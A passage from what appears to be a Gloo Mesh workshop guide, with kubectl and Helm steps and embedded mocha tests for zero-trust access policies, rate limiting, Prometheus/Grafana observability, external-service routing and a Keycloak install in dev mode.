timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Run the following commands to initiate a communication from a service which is in the mesh to another service which is in the mesh:

```
pod=$(kubectl --context ${CLUSTER1} -n httpbin get pods -l app=in-mesh -o jsonpath='{.items[0].metadata.name}')
kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/curl -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
```

<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');
describe("Communication allowed", () => {
  it("Response code should be 200", () => {
    const podName = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin get pods -l app=in-mesh -o jsonpath='{.items[0].metadata.name}'" }).replaceAll("'", "");
    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin debug -i -q " + podName + " --image=curlimages/curl -- curl -s -o /dev/null -w \"%{http_code}\" http://reviews.bookinfo-backends:9080/reviews/0" }).replaceAll("'", "");
    expect(command).to.contain("200");
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/zero-trust/tests/in-mesh-to-in-mesh-allowed.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

You should get a `200` response code again.

To enfore a zero trust policy, it shouldn't be the case.

We'll leverage the Gloo Mesh workspaces to get to a state where:

- communications between services which are in the mesh and others which aren't in the mesh aren't allowed anymore
- communications between services in the mesh are allowed only when services are in the same workspace or when their workspaces have import/export rules.

The Bookinfo team must update its `WorkspaceSettings` Kubernetes object to enable service isolation.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: bookinfo
  namespace: bookinfo-frontends
spec:
  importFrom:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
  exportTo:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
      labels:
        app: productpage
    - kind: SERVICE
      labels:
        app: reviews
    - kind: ALL
      labels:
        expose: "true"
  options:
    serviceIsolation:
      enabled: true
      trimProxyConfig: true
EOF
```

When service isolation is enabled, Gloo Mesh creates the corresponding Istio `AuthorizationPolicy` and `PeerAuthentication` objects to enforce zero trust.

When `trimProxyConfig` is set to `true`, Gloo Mesh also creates the corresponding Istio `Sidecar` objects to program the sidecar proxies to only know how to talk to the authorized services.

If you refresh the browser, you'll see that the bookinfo application is still exposed and working correctly.

Run the following commands to initiate a communication from a service which isn't in the mesh to a service which is in the mesh:

```
pod=$(kubectl --context ${CLUSTER1} -n httpbin get pods -l app=not-in-mesh -o jsonpath='{.items[0].metadata.name}')
kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/curl -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
```

You shouldn't get a `200` response code, which means that the communication isn't allowed.

<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');
describe("Communication not allowed", () => {
  it("Response code shouldn't be 200", () => {
    const podName = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin get pods -l app=not-in-mesh -o jsonpath='{.items[0].metadata.name}'" }).replaceAll("'", "");
    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin debug -i -q " + podName + " --image=curlimages/curl -- curl -s -o /dev/null -w \"%{http_code}\" --max-time 3 http://reviews.bookinfo-backends:9080/reviews/0" }).replaceAll("'", "");
    expect(command).not.to.contain("200");
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/zero-trust/tests/not-in-mesh-to-in-mesh-not-allowed.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Run the following commands to initiate a communication from a service which is in the mesh to another service which is in the mesh:

```
pod=$(kubectl --context ${CLUSTER1} -n httpbin get pods -l app=in-mesh -o jsonpath='{.items[0].metadata.name}')
kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/curl -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
```

<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');
describe("Communication not allowed", () => {
  it("Response code shouldn't be 200", () => {
    const podName = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin get pods -l app=in-mesh -o jsonpath='{.items[0].metadata.name}'" }).replaceAll("'", "");
    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin debug -i -q " + podName + " --image=curlimages/curl -- curl -s -o /dev/null -w \"%{http_code}\" --max-time 3 http://reviews.bookinfo-backends:9080/reviews/0" }).replaceAll("'", "");
    expect(command).not.to.contain("200");
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/zero-trust/tests/in-mesh-to-in-mesh-not-allowed.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

You shouldn't get a `200` response code, which means that the communication isn't allowed.

You've see seen how Gloo Platform can help you to enforce a zero trust policy (at workspace level) with nearly no effort.

Now we are going to define some additional policies to achieve zero trust at service level.

We are going to define AccessPolicies from the point of view of a service producers. 

> I am owner of service A, which services needs to communicate with me?

![Gloo Mesh Gateway](images/steps/zero-trust/gloo-mesh-gateway.svg)

Productpage app is the only service which is exposed to the internet, so we will create an `AccessPolicy` to allow the Istio Ingress Gateway to forward requests to the productpage service.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: AccessPolicy
metadata:
  name: allow-productpage
  namespace: bookinfo-frontends
spec:
  applyToDestinations:
  - selector:
      labels:
        app: productpage
  config:
    authz:
      allowedClients:
      - serviceAccountSelector:
          name: istio-ingressgateway-1-18-service-account
          namespace: istio-gateways
      - serviceAccountSelector:
          name: istio-eastwestgateway-1-18-service-account
          namespace: istio-gateways
      - serviceAccountSelector:
          name: ext-auth-service
          namespace: gloo-mesh-addons
      - serviceAccountSelector:
          name: rate-limiter
          namespace: gloo-mesh-addons
EOF
```

Details and reviews are both used by the productpage service, so we will create an AccessPolicy to allow the productpage service to forward requests to the details and reviews services.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: AccessPolicy
metadata:
  name: allow-details-reviews
  namespace: bookinfo-frontends
spec:
  applyToDestinations:
  - selector:
      labels:
        app: details
  - selector:
      labels:
        app: reviews
  config:
    authz:
      allowedClients:
      - serviceAccountSelector:
          name: bookinfo-productpage
      allowedMethods:
      - GET
EOF
```

Note that this is a layer 7 policy because we only allow the `GET` method to be used by the productpage service.

Finally, we will create an AccessPolicy to allow the reviews service to forward requests to the ratings service.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: security.policy.gloo.solo.io/v2
kind: AccessPolicy
metadata:
  name: allow-ratings
  namespace: bookinfo-frontends
spec:
  applyToDestinations:
  - selector:
      labels:
        app: ratings
  config:
    authz:
      allowedClients:
      - serviceAccountSelector:
          name: bookinfo-reviews
EOF
```

Let's check that requests from `productpage` are denied/allowed properly:

```sh
pod=$(kubectl --context ${CLUSTER1} -n bookinfo-frontends get pods -l app=productpage -o jsonpath='{.items[0].metadata.name}')
echo "From productpage to details, should be allowed"
kubectl --context ${CLUSTER1} -n bookinfo-frontends debug -i -q ${pod} --image=curlimages/curl -- curl -s http://details.bookinfo-backends:9080/details/0 | jq

echo "From productpage to reviews with GET, should be allowed"
kubectl --context ${CLUSTER1} -n bookinfo-frontends debug -i -q ${pod} --image=curlimages/curl -- curl -s http://reviews.bookinfo-backends:9080/reviews/0 | jq

echo "From productpage to reviews with HEAD, should be denied"
kubectl --context ${CLUSTER1} -n bookinfo-frontends debug -i -q ${pod} --image=curlimages/curl -- curl -s http://reviews.bookinfo-backends:9080/reviews/0 -X HEAD

echo "From productpage to ratings, should be denied"
kubectl --context ${CLUSTER1} -n bookinfo-frontends debug -i -q ${pod} --image=curlimages/curl -- curl -s http://ratings.bookinfo-backends:9080/ratings/0
```

You shouldn't get a `200` response code for the last one, which means that the communication isn't allowed.

<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');

describe("Communication status", () => {

  it("Response code shouldn't be 200 accessing ratings", () => {
    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n bookinfo-frontends exec deploy/productpage-v1 -- python -c \"import requests; r = requests.get('http://ratings.bookinfo-backends:9080/ratings/0', timeout=3); print(r.status_code)\"" }).replaceAll("'", "");
    expect(command).not.to.contain("200");
  });

  it("Response code should be 200 accessing reviews with GET", () => {
    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n bookinfo-frontends exec deploy/productpage-v1 -- python -c \"import requests; r = requests.get('http://reviews.bookinfo-backends:9080/reviews/0'); print(r.status_code)\"" }).replaceAll("'", "");
    expect(command).to.contain("200");
  });

  it("Response code should be 403 accessing reviews with HEAD", () => {
    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n bookinfo-frontends exec deploy/productpage-v1 -- python -c \"import requests; r = requests.head('http://reviews.bookinfo-backends:9080/reviews/0'); print(r.status_code)\"" }).replaceAll("'", "");
    expect(command).to.contain("403");
  });

  it("Response code should be 200 accessing details", () => {
    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n bookinfo-frontends exec deploy/productpage-v1 -- python -c \"import requests; r = requests.get('http://details.bookinfo-backends:9080/details/0'); print(r.status_code)\"" }).replaceAll("'", "");
    expect(command).to.contain("200");
  });
});

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/zero-trust/tests/bookinfo-access.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
Let's rollback the change we've made in the `WorkspaceSettings` object:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: bookinfo
  namespace: bookinfo-frontends
spec:
  importFrom:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
  exportTo:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
      labels:
        app: productpage
    - kind: SERVICE
      labels:
        app: reviews
    - kind: SERVICE
      labels:
        app: ratings
    - kind: ALL
      labels:
        expose: "true"
EOF
```

and delete the `AccessPolicies`:

```bash
kubectl --context ${CLUSTER1} delete accesspolicies -n bookinfo-frontends --all
```





## Lab 14 - Apply rate limiting to east west communication <a name="lab-14---apply-rate-limiting-to-east-west-communication-"></a>


In this step, we're going to apply rate limiting to east west traffic to only allow 3 requests per minute from the `productpage` to the `details` service.

First, we need to create a `RateLimitClientConfig` object to define the descriptors:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: RateLimitClientConfig
metadata:
  name: details
  namespace: bookinfo-frontends
spec:
  raw:
    rateLimits:
    - actions:
      - genericKey:
          descriptorValue: counter
EOF
```

Then, we need to create a `RateLimitServerConfig` object to define the limits based on the descriptors:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: RateLimitServerConfig
metadata:
  name: details
  namespace: bookinfo-frontends
spec:
  destinationServers:
  - ref:
      cluster: cluster1
      name: rate-limiter
      namespace: gloo-mesh-addons
    port:
      name: grpc
  raw:
    descriptors:
    - key: generic_key
      rateLimit:
        requestsPerUnit: 3
        unit: MINUTE
      value: counter
EOF
```

After that, we need to create a `RateLimitPolicy` object to define the descriptors:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: RateLimitPolicy
metadata:
  name: details
  namespace: bookinfo-frontends
spec:
  applyToDestinations:
  - port:
      number: 9080
    selector:
      labels:
        app: details
  config:
    serverSettings:
      name: rate-limit-server
      namespace: bookinfo-frontends
      cluster: cluster1
    ratelimitClientConfig:
      name: details
      namespace: bookinfo-frontends
      cluster: cluster1
    ratelimitServerConfig:
      name: details
      namespace: bookinfo-frontends
      cluster: cluster1
EOF
```

We also need to create a `RateLimitServerSettings`, which is a CRD that define which ratelimit server to use: 

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: RateLimitServerSettings
metadata:
  name: rate-limit-server
  namespace: bookinfo-frontends
spec:
  destinationServer:
    ref:
      cluster: cluster1
      name: rate-limiter
      namespace: gloo-mesh-addons
    port:
      name: grpc
EOF
```

Now, run the following command several time:

```
kubectl --context $CLUSTER1 -n bookinfo-frontends exec -it $(kubectl --context $CLUSTER1 -n bookinfo-frontends get pods -l app=productpage -o jsonpath='{.items[0].metadata.name}') -- python -c "import requests; r = requests.get('http://details.bookinfo-backends:9080/details/0'); print(r.status_code)"
```

It sends a request from the `productpage` to the `details` service and display the HTTP response status code.

You should get a `200` response code the first 3 time and a `429` response code after.

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("The productpage service should be rate limited after calling the details service more than 3 times", () => {
  const command = "kubectl -n bookinfo-frontends exec deploy/productpage-v1 --context " + process.env.CLUSTER1 + " -- python -c \"import requests; r = requests.get('http://details.bookinfo-backends:9080/details/0'); print(r.status_code)\"";
  it('Got the expected status code 429', () => helpers.genericCommand({ command: command, responseContains: "429" }));
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/eastwest-ratelimiting/tests/rate-limited.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

And also delete the different objects we've created:

```bash
kubectl --context ${CLUSTER1} -n bookinfo-frontends delete ratelimitpolicy details
kubectl --context ${CLUSTER1} -n bookinfo-frontends delete ratelimitclientconfig details
kubectl --context ${CLUSTER1} -n bookinfo-frontends delete ratelimitserverconfig details
kubectl --context ${CLUSTER1} -n bookinfo-frontends delete ratelimitserversettings rate-limit-server
```




## Lab 15 - See how Gloo Platform can help with observability <a name="lab-15---see-how-gloo-platform-can-help-with-observability-"></a>
[<img src="https://img.youtube.com/vi/UhWsk4YnOy0/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/UhWsk4YnOy0 "Video Link")

# Observability with Gloo Platform

Let's take a look at how Gloo Platform can help with observability!

![Gloo Platform OTel arch](images/steps/gloo-platform-observability/metrics-architecture-otel.svg)

Our telemetry pipeline's main goal is to collect all the metrics, and securely forward them to the management cluster, making all the metrics available for our UI to visualize the service graph.

Since our pipeline is leveraging OpenTelemetry, this pipeline can be customized and extended to cover all possible use-cases, e.g. collecting telemetry from other workloads, or integrating with centralized observability platform/SaaS solutions.

## Gloo Platform Operational Dashboard 

First let's deploy the usual Prometheus stack, and explore our management plane metrics.

```bash
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
helm repo update

helm upgrade --install kube-prometheus-stack \
prometheus-community/kube-prometheus-stack \
--kube-context ${MGMT} \
--version 44.3.1 \
--namespace monitoring \
--create-namespace \
--values - <<EOF
grafana:
  service:
    type: LoadBalancer
    port: 3000
  additionalDataSources:
  - name: prometheus-GM
    uid: prometheus-GM
    type: prometheus
    url: http://prometheus-server.gloo-mesh:80
EOF
```
<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("kube-prometheus-stack deployments are ready", () => {
  it('kube-prometheus-stack-kube-state-metrics pods are ready', () => helpers.checkDeployment({ context: process.env.MGMT, namespace: "monitoring", k8sObj: "kube-prometheus-stack-kube-state-metrics" }));
  it('kube-prometheus-stack-grafana pods are ready', () => helpers.checkDeployment({ context: process.env.MGMT, namespace: "monitoring", k8sObj: "kube-prometheus-stack-grafana" }));
  it('kube-prometheus-stack-operator pods are ready', () => helpers.checkDeployment({ context: process.env.MGMT, namespace: "monitoring", k8sObj: "kube-prometheus-stack-operator" }));
});

describe("kube-prometheus-stack daemonset is ready", () => {
  it('kube-prometheus-stack-prometheus-node-exporter pods are ready', () => helpers.checkDaemonSet({ context: process.env.MGMT, namespace: "monitoring", k8sObj: "kube-prometheus-stack-prometheus-node-exporter" }));
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/gloo-platform-observability/tests/grafana-installed.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
Let's install a few dashboards!

Now, you can go the the Grafana tab, log in with the default login credentials, admin/prom-operator, and import the dashboard of Istio control plane.

Add the Operational Dashboard
=============================


Our Gloo components are all instrumented with Prometheus compatible metrics, providing an easy way to pinpoint a potential degradation.

You can import the following dashboard to see our Operational Dashboard, covering all of our components in the stack.

Here, you have specific rows for each components, such as the management server, the agent, the telemetry collectors, and some additional information regarding resource usage.

```bash
kubectl --context ${MGMT} -n monitoring create cm operational-dashboard \
--from-file=data/steps/gloo-platform-observability/operational-dashboard.json
kubectl --context ${MGMT} label -n monitoring cm operational-dashboard grafana_dashboard=1
```

Out-of-box alerting
===================
			    
Our Prometheus comes with useful alerts by default, making it easier to get notified if something breaks.

All of the default alerts have corresponding panels on the Operational Dashboard.

You can click the "Bell" icon on the left, and choose "Alert rules", and check "GlooPlatformAlerts" to take a closer look at them. 

Let's trigger one of the alerts!

If you scale down the Gloo Agent in let's say `cluster1`, you should have an alert called `GlooPlatformAgentsAreDisconnected` go into first PENDING, then FIRING, let's check this!

```sh
kubectl --context $CLUSTER1 scale deployment.apps/gloo-mesh-agent -n gloo-mesh --replicas=0
```

The alert will fire in 5m, but even before that, it will reach PENDING state, let's wait for this!

Don't forget to scale it up after:

```sh
kubectl --context $CLUSTER1 scale deployment.apps/gloo-mesh-agent -n gloo-mesh --replicas=1
```

Collect remote IstioD metrics securely
======================================

Let's take a look how easy it is to modify the metrics collection in the workload clusters, to collect IstioD metrics, and ship them to the management cluster over TLS.

```bash
helm upgrade --install gloo-platform gloo-platform/gloo-platform \
  --namespace gloo-mesh \
  --kube-context=${CLUSTER1} \
  --reuse-values \
  --version 2.4.6 \
  --values - <<EOF
telemetryCollectorCustomization:
  extraProcessors:
    batch/istiod:
      send_batch_size: 10000
      timeout: 10s
    filter/istiod:
      metrics:
        include:
          match_type: regexp
          metric_names:
            - "pilot.*"
            - "process.*"
            - "go.*"
            - "container.*"
            - "envoy.*"
            - "galley.*"
            - "sidecar.*"
          # - "istio_build.*" re-enable this after this is fixed upstream
  extraPipelines:
    metrics/istiod:
      receivers:
      - prometheus
      processors:
      - memory_limiter
      - batch/istiod
      - filter/istiod
      exporters:
      - otlp
EOF
```

This configuration update will
  - create a new processor, called `filter/istiod`, that will enable all the IstioD/Pilot related metrics
  - create a new pipeline, called `metrics/istiod`, that will have the aforementioned processor to include the control plane metrics

Then, we just need to perform a rollout restart for the metrics collector, so the new pods can pick up the config change.

```bash
kubectl --context $CLUSTER1 rollout restart daemonset/gloo-telemetry-collector-agent -n gloo-mesh
```

Now, let's import the Istio Control Plane Dashboard, and see the metrics!
```bash
kubectl --context ${MGMT} -n monitoring create cm istio-control-plane-dashboard \
--from-file=data/steps/gloo-platform-observability/istio-control-plane-dashboard.json
kubectl --context ${MGMT} label -n monitoring cm istio-control-plane-dashboard grafana_dashboard=1
```




## Lab 16 - Create the httpbin workspace <a name="lab-16---create-the-httpbin-workspace-"></a>

We're going to create a workspace for the team in charge of the httpbin application.

The platform team needs to create the corresponding `Workspace` Kubernetes objects in the Gloo Mesh management cluster.

Let's create the `httpbin` workspace which corresponds to the `httpbin` namespace on `cluster1`:

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: Workspace
metadata:
  name: httpbin
  namespace: gloo-mesh
  labels:
    allow_ingress: "true"
spec:
  workloadClusters:
  - name: cluster1
    namespaces:
    - name: httpbin
EOF
```

Then, the Httpbin team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `httpbin` workspace:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: WorkspaceSettings
metadata:
  name: httpbin
  namespace: httpbin
spec:
  importFrom:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
  exportTo:
  - workspaces:
    - name: gateways
    resources:
    - kind: SERVICE
      labels:
        app: in-mesh
    - kind: ALL
      labels:
        expose: "true"
EOF
```

The Httpbin team has decided to export the following to the `gateway` workspace (using a reference):
- the `in-mesh` Kubernetes service
- all the resources (RouteTables, VirtualDestination, ...) that have the label `expose` set to `true`



## Lab 17 - Expose an external service <a name="lab-17---expose-an-external-service-"></a>
[<img src="https://img.youtube.com/vi/jEqDoITpRss/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/jEqDoITpRss "Video Link")

In this step, we're going to expose an external service through a Gateway using Gloo Mesh and show how we can then migrate this service to the Mesh.

Let's create an `ExternalService` corresponding to `httpbin.org`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: ExternalService
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
  - httpbin.org
  ports:
  - name: http
    number: 80
    protocol: HTTP
  - name: https
    number: 443
    protocol: HTTPS
    clientsideTls: {}
EOF
```

Now, you can create a `RouteTable` to expose `httpbin.org` through the gateway:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      forwardTo:
        destinations:
        - kind: EXTERNAL_SERVICE
          port:
            number: 443
          ref:
            name: httpbin
            namespace: httpbin
EOF
```

You should now be able to access `httpbin.org` external service through the gateway.

Make sure the domain is in our `/etc/hosts` file:

```bash
./scripts/register-domain.sh cluster1-httpbin.example.com ${HOST_GW_CLUSTER1}
```

You can access the `httpbin` service from the second cluster using this URL: [https://cluster1-httpbin.example.com/get](https://cluster1-httpbin.example.com/get).
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin from the external service", () => {
  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-external.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Let's update the `RouteTable` to direct 50% of the traffic to the local `httpbin` service:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      forwardTo:
        destinations:
        - kind: EXTERNAL_SERVICE
          port:
            number: 443
          ref:
            name: httpbin
            namespace: httpbin
          weight: 50
        - ref:
            name: in-mesh
            namespace: httpbin
            cluster: cluster1
          port:
            number: 8000
          weight: 50
EOF
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin from the local service", () => {
  it('Got the expected status code 200', () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com/get`, retCode: 200 }));
  it('Checking text \'X-Amzn-Trace-Id\' not in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: false }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-local.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->
<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin from the external service", () => {
  it('Checking text \'X-Amzn-Trace-Id\' in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: true }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-external.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

If you refresh your browser, you should see that you get a response either from the local service or from the external service.

When the response comes from the external service (httpbin.org), there's a `X-Amzn-Trace-Id` header.

And when the response comes from the local service, there's a `X-B3-Parentspanid` header.

Finally, you can update the `RouteTable` to direct all the traffic to the local `httpbin` service:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
            cluster: cluster1
          port:
            number: 8000
EOF
```

<!--bash
cat <<'EOF' > ./test.js
const helpersHttp = require('./tests/chai-http');

describe("httpbin from the local service", () => {
  it('Got the expected status code 200', () => helpersHttp.checkURL({ host: `https://cluster1-httpbin.example.com/get`, retCode: 200 }));
  it('Checking text \'X-Amzn-Trace-Id\' not in ' + process.env.CLUSTER1, () => helpersHttp.checkBody({ host: `https://cluster1-httpbin.example.com`, path: '/get', body: 'X-Amzn-Trace-Id', match: false }));
})
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/gateway-external-service/tests/httpbin-from-local.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

If you refresh your browser, you should see that you get responses only from the local service.

This diagram shows the flow of the requests :

![Gloo Mesh Gateway EXternal Service](images/steps/gateway-external-service/gloo-mesh-gateway-external-service.svg)

Let's delete the `ExternalService` we've created:

```bash
kubectl --context ${CLUSTER1} -n httpbin delete externalservices.networking.gloo.solo.io httpbin
```



## Lab 18 - Deploy Keycloak <a name="lab-18---deploy-keycloak-"></a>

In many use cases, you need to restrict the access to your applications to authenticated users.

OpenID Connect (OIDC) is an identity layer on top of the OAuth 2.0 protocol. In OAuth 2.0 flows, authentication is performed by an external Identity Provider (IdP) which, in case of success, returns an Access Token representing the user identity. The protocol does not define the contents and structure of the Access Token, which greatly reduces the portability of OAuth 2.0 implementations.

The goal of OIDC is to address this ambiguity by additionally requiring Identity Providers to return a well-defined ID Token. OIDC ID tokens follow the JSON Web Token standard and contain specific fields that your applications can expect and handle. This standardization allows you to switch between Identity Providers – or support multiple ones at the same time – with minimal, if any, changes to your downstream services; it also allows you to consistently apply additional security measures like Role-Based Access Control (RBAC) based on the identity of your users, i.e. the contents of their ID token.

In this lab, we're going to install Keycloak. It will allow us to setup OIDC workflows later.

Let's install it:

```bash
kubectl --context ${MGMT} create namespace keycloak

kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: v1
kind: Service
metadata:
  name: keycloak
  namespace: keycloak
  labels:
    app: keycloak
spec:
  ports:
  - name: http
    port: 8080
    targetPort: 8080
  selector:
    app: keycloak
  type: LoadBalancer
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: keycloak
  namespace: keycloak
  labels:
    app: keycloak
spec:
  replicas: 1
  selector:
    matchLabels:
      app: keycloak
  template:
    metadata:
      labels:
        app: keycloak
    spec:
      containers:
      - name: keycloak
        image: quay.io/keycloak/keycloak:22.0.5
        args: ["start-dev"]
        env:
        - name: KEYCLOAK_ADMIN
          value: "admin"
        - name: KEYCLOAK_ADMIN_PASSWORD
          value: "admin"
        - name: PROXY_ADDRESS_FORWARDING
          value: "true"
        ports:
        - name: http
          containerPort: 8080
        readinessProbe:
          httpGet:
            path: /realms/master
            port: 8080
EOF

kubectl --context ${MGMT} -n keycloak rollout status deploy/keycloak
```



<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("Keycloak", () => {
